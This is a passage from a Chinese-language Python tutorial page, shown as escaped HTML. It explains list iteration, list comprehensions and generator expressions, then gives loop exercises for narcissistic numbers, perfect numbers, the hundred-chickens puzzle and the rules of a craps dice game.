&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(i)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过try…except…自动迭代列表&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;clip_image002.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;通过for循环自动迭代列表&lt;&#x2F;p&gt;
&lt;p&gt;列表解析&lt;&#x2F;p&gt;
&lt;p&gt;动态的创建列表&lt;&#x2F;p&gt;
&lt;p&gt;列表解析是迭代技术的一个应用，采用for循环和迭代函数动态生成列表，简洁方便&lt;&#x2F;p&gt;
&lt;p&gt;[X for Y in Z]&lt;&#x2F;p&gt;
&lt;p&gt;[X for Y in Z if J]&lt;&#x2F;p&gt;
&lt;p&gt;生成器表达式&lt;&#x2F;p&gt;
&lt;p&gt;生成器（generator）是特定的函数，容许返回一个值，然后“暂停”代码的执行，稍后恢复&lt;&#x2F;p&gt;
&lt;p&gt;生成器函数&lt;&#x2F;p&gt;
&lt;p&gt;在Python中，带有yield的函数称之为生成器，使用yield语句一次返回一个结果，在每一个结果之间挂起和继续它们的状态。&lt;&#x2F;p&gt;
&lt;p&gt;生成器表达式是生成器的应用，是列表解析和生成器的结合。&lt;&#x2F;p&gt;
&lt;p&gt;生成器表达式是按需返回产生结果的一个对象，而不是返回一整个结果列表&lt;&#x2F;p&gt;
&lt;p&gt;列表解析是直接生成最终的列表，而生成器表达式按需生成更加节省内存空间&lt;&#x2F;p&gt;
&lt;p&gt;语法&lt;&#x2F;p&gt;
&lt;p&gt;（X for Y in Z）&lt;&#x2F;p&gt;
&lt;p&gt;列表解析用中括号，生成器表达式用小括号&lt;&#x2F;p&gt;
&lt;p&gt;练习1：寻找水仙花数&lt;&#x2F;p&gt;
&lt;p&gt;如果一个位数等于其他各位数字的立方和，则这个数就称为水仙花数&lt;&#x2F;p&gt;
&lt;p&gt;求100-999之间的水仙花数&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1000&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  a=i&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  b=(i-a*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;)&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  c=(i-a*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;-b*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;i==a**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;+b**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;+c**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(i)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1000&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  a=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(i)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;])  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# &amp;#39;153&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  b=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(i)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;])&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  c=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(i)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;])&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;i == a**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;+b**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;+c**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(i)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;练习2：寻找1000以内的完美数&lt;&#x2F;p&gt;
&lt;p&gt;找出一个数的所有因数（约数），如果这些因数（除去它本身）的和等于该数，则它就是完美数&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;l=[]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1001&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  k=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,i):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(i%j==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​      k=k+j&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;i==k:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    l.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(i)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(l)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;百鸡百钱问题&lt;&#x2F;p&gt;
&lt;p&gt;百钱买百鸡：现有100钱，公鸡5文钱一只，母鸡3文钱一只，小鸡一文钱3只 要求：公鸡、母鸡，小鸡都要有，把100文钱花完，买的鸡的数量正好是100。 问：一共能买多少只公鸡，多少只母鸡，多少只小鸡？&lt;&#x2F;p&gt;
&lt;p&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# a+b+3c=100&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;\&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;# 5a+3b+c=100&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;34&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;a+b+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;*c==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;*a+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;*b+c==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;公鸡：&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;只&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;母鸡：&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;只&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;小鸡：&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;只&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;%(a,b,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;*c))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;gongji &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;101&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;muji &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;101&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;xiaoji &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;101&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;gongji*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;+muji*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;+xiaoji==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;gongji+muji+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;*xiaoji==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;公鸡有&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;只,母鸡有&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;只,小鸡有&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;只&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(gongji,muji,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;*xiaoji))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;gongji &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;101&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;muji &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;101&lt;&#x2F;span&gt;&lt;span&gt;-gongji,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;xiaoji &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;101&lt;&#x2F;span&gt;&lt;span&gt;-gongji-muji):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;gongji&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;+muji&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;+xiaoji*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100 &lt;&#x2F;span&gt;&lt;span&gt;and gongji+muji+xiaoji==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;公鸡有&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;只,母鸡有&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;只,小鸡有&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;只&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(gongji&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;,muji&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;,xiaoji*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Crap摇骰子游戏&lt;&#x2F;p&gt;
&lt;p&gt;玩家摇两颗骰子，如果第一次摇出7点或者11点，玩家胜&lt;&#x2F;p&gt;
&lt;p&gt;如果摇出2点、3点、12点，庄家胜&lt;&#x2F;p&gt;
&lt;p&gt;其他情况继续游戏&lt;&#x2F;p&gt;
&lt;p&gt;玩家再次摇骰子，如果摇出7点，庄家胜&lt;&#x2F;p&gt;
&lt;p&gt;如果摇出第一次摇的点数，玩家胜&lt;&#x2F;p&gt;
&lt;p&gt;否则游戏继续，玩家继续摇骰子&lt;&#x2F;p&gt;
